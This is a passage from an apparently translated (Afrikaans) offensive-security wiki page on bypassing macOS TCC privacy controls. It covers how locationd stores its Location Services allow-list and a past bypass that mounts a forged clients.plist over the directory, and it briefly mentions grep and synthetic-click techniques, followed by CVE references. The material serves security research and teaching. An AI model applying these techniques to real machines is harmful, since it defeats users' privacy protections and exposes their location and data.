Location Services word **nie** soos die ander dienste in ’n TCC-databasis gestoor nie. Dit word deur `locationd` bestuur, wat sy eie toelatingslys in **`/var/db/locationd/clients.plist`** byhou:<sup>[[4]](#references)</sup>

```bash
# Requires FDA to read
sudo plutil -p /var/db/locationd/clients.plist | head -40
```

Elke inskrywing word volgens die kliënt (bundle ID of uitvoerbare lêerpad) geïndekseer en bevat velde soos `Authorized`, `BundleId`, `Executable` en `Registered`.<sup>[[4]](#references)</sup>

Die `clients.plist`-lêer self word deur Sandbox/TCC beskerm en kan nie eens as root gewysig word nie — maar die **`/var/db/locationd/`-gids was nie teen montering beskerm nie**. ’n Aanvaller wat as root loop, kon dus ’n skyfbeeld met hul eie `clients.plist` (met hul binêre lêer as `Authorized` gemerk) skep, dit oor die gids mount en `locationd` herbegin sodat die vervalste allow-list in werking tree.<sup>[[3]](#references)</sup>

> [!TIP]
> Dit is dieselfde patroon as die `hdiutil`/`mount` TCC-bypasses hierbo: die *lêer* word beskerm, maar die *gids waarin dit is* nie, dus vervang jy die hele gids in plaas van die lêer.

## Via opstartprogramme


{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

## Via grep

By verskeie geleenthede stoor lêers sensitiewe inligting soos e-posadresse, telefoonnommers en boodskappe... op onbeskermde liggings (wat volgens Apple as ’n kwesbaarheid tel).

<figure><img src="../../../../../images/image (474).png" alt=""><figcaption></figcaption></figure>

## Synthetic Clicks

Dit werk nie meer nie, maar dit [**het in die verlede gewerk**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**:**

<figure><img src="../../../../../images/image (29).png" alt=""><figcaption></figcaption></figure>

Nog ’n metode met [**CoreGraphics events**](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf):<sup>[[17]](#references)</sup>

<figure><img src="../../../../../images/image (30).png" alt="" width="563"><figcaption></figcaption></figure>

## References

- [1] [CVE-2020–9934: Om die macOS Transparency, Consent, and Control (TCC)-raamwerk te omseil](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
- [2] [Om macOS TCC-gebruikersprivaatheidsbeskerming per ongeluk en doelbewus te omseil](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
- [3] [CVE-2022-22655 - TCC Location Services-omseiling (oorspronklike verslag)](https://theevilbit.github.io/posts/cve-2022-22655/)
- [4] [Waar in die wêreld is Carmen Sandiego: Misbruik van Location Services op macOS](https://slyd0g.medium.com/where-in-the-world-is-carmen-sandiego-abusing-location-services-on-macos-10e9f4eefb71)
- [5] [Jamf Threat Labs - CVE-2024-44131: TCC-omseiling steel data uit iCloud](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/)
- [6] [SQLite - `test_sqllog.c` (SQLITE_ENABLE_SQLLOG-omgewingsveranderlikes)](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)
- [7] [Apple - Toestaan van DYLD-omgewingsveranderlikes-entitlement](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables)
- [8] [The Eclectic Light Company - Notarisering: die hardened runtime](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/)
- [9] [Zero-day TCC-omseiling in XCSSET-malware ontdek](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)
- [10] [OBTS v5.0: "Wat op jou Mac gebeur, bly op Apple se iCloud?!" - Wojciech Regula](https://www.youtube.com/watch?v=_6e2LhmxVc0)
- [11] [Nuwe macOS-kwesbaarheid, "powerdir," kan tot ongemagtigde toegang tot gebruikersdata lei](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/)
- [12] [Verander die tuisgids en omseil TCC, oftewel CVE-2020-27937](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/)
- [13] [Speel die musiek en omseil TCC, oftewel CVE-2020-29621](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/)
- [14] [Hoe om ’n (Fire)fox te beroof](https://wojciechregula.blog/post/how-to-rob-a-firefox/)
- [15] [CVE-2023-26818 - Om TCC met Telegram in macOS te omseil](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)
- [16] [Kandji - Ontbloting van Apple-kwesbaarhede: oudit van diskarbitrationd en storagekitd, deel 2](https://www.kandji.io/blog/macos-audit-story-part2)
- [17] [Patrick Wardle - Objective by the Sea v2.0: Synthetic Clicks & CoreGraphics Event Taps](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf)
- [18] [breakpointHQ/TCC-ClickJacking - Bewys van konsep](https://github.com/breakpointHQ/TCC-ClickJacking)
- [19] [Stack Overflow - Stel omgewingsveranderlikes op OS X in](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686)
- [20] [theevilbit - CVE-2020-9771: mount_apfs TCC-omseiling en voorregte-eskalasie](https://theevilbit.github.io/posts/cve_2020_9771/)
- [21] [theevilbit - CVE-2021-30808: TCC-omseiling deur bo-oor die TCC-databasis te mount](https://theevilbit.github.io/posts/cve-2021-30808/)
- [22] [20+ maniere om jou macOS-privaatheidsmeganismes te omseil](https://www.youtube.com/watch?v=W9GxnP8c8FU)
- [23] [Oorwinning teen TCC - 20+ nuwe maniere om jou macOS-privaatheidsmeganismes te omseil](https://www.youtube.com/watch?v=a9hsxPdRxsY)
- [24] [Van Spotlight tot Apple Intelligence — Misbruik van ’n 0day om die data te steel wat macOS AI aandryf](https://objective-see.org/blog/blog_0x81.html)
{{#include ../../../../../banners/hacktricks-training.md}}
